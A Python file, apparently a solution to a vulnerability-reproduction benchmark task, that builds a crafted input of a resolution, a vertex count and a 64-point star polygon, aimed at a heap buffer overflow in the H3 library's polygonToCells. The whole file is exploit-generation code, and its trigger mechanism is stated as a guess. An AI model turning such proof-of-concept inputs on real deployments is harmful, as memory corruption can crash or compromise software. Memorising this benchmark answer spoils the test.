import struct
import math

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        Based on the ground-truth length of 1032 bytes and H3 fuzzer patterns:
        - 4 bytes: Resolution (int32)
        - 4 bytes: Number of vertices (int32)
        - N * 16 bytes: Array of LatLng (double, double)
        
        1032 - 8 = 1024 bytes for vertices.
        1024 / 16 = 64 vertices.
        
        The vulnerability is a heap buffer overflow due to under-estimation in polygonToCells.
        This often occurs with non-convex polygons or specific geometries where maxPolyfillSize
        returns a value smaller than the actual number of cells found.
        """
        
        # Parameters
        # Resolution 5 provides enough grid density to potentially trigger estimation errors
        # without consuming excessive memory/time.
        resolution = 5
        num_vertices = 64
        
        # Generate a non-convex star-shaped polygon.
        # This shape has a higher perimeter-to-area ratio and concavities
        # which can stress the bounding-box based estimation logic.
        center_lat = 0.5
        center_lon = 0.5
        radius_outer = 0.1
        radius_inner = 0.05
        
        vertices_bytes = bytearray()
        
        for i in range(num_vertices):
            angle = 2.0 * math.pi * i / num_vertices
            # Alternate radius to create a star shape
            r = radius_outer if (i % 2 == 0) else radius_inner
            
            lat = center_lat + r * math.sin(angle)
            lon = center_lon + r * math.cos(angle)
            
            # Append LatLng as two doubles (little-endian)
            vertices_bytes += struct.pack('<dd', lat, lon)
        
        # Header: Resolution (int32) + NumVertices (int32)
        header = struct.pack('<ii', resolution, num_vertices)
        
        return header + vertices_bytes